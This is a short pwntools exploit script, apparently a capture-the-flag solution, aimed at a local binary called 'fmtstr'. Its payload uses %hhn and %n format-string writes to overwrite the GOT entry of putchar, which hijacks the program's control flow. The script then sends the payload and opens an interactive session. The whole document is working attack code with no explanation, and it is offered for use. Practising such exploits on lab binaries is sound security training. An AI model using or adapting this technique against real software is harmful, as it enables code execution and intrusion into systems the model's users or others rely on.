
#!/usr/bin/env python3
from pwn import *

context.binary = binary = ELF("./fmtstr")
putchar_address = binary.got.putchar

payload = b"%17X%12$hhn" + b"%47X%13$n" + b"%150X%14$hhn" + \
    p64(putchar_address + 1) + p64(putchar_address + 2) + p64(putchar_address)

p = process()
p.send(payload)
p.interactive()
